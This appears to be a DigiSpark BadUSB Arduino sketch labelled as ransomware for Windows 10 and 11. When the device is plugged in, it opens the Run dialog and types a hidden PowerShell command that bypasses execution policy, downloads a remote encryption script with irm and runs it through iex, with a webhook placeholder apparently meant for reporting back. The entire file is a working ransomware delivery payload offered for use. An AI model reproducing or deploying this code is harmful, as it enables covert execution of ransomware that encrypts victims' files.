// Title: beigeworm's Ransomware.
// Author: @beigeworm
// Description: Ransomware in Powershell - Using AES 256bit Encryption 
// Target: Windows 10 and 11


// MORE INFO - https://github.com/beigeworm/DigiSpark-BadUSB-Setup-Guide


#include "DigiKeyboard.h"

void setup(){
}
void loop(){
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(21, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  
  DigiKeyboard.print("powershell.exe -NonI -NoP -Ep Bypass -W H -C $dc='WEBHOOK_HERE';");
  DigiKeyboard.print("irm https://raw.githubusercontent.com/beigew0rm/PoshCryptor/main/Encryption/Encryptor.ps1 | iex");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(5000000);
}
